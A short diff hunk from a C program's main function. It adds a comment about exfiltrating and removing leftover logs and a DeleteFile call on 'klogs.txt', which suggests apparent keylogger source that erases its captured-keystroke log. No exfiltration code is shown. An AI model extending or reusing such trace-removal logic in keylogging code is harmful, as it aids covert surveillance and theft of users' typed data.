@@ -82,5 +82,8 @@ int main(void)
             }
         }
     }
+
+    // exfiltrate and remove any leftover logs...
+    DeleteFile("klogs.txt");
 }
 
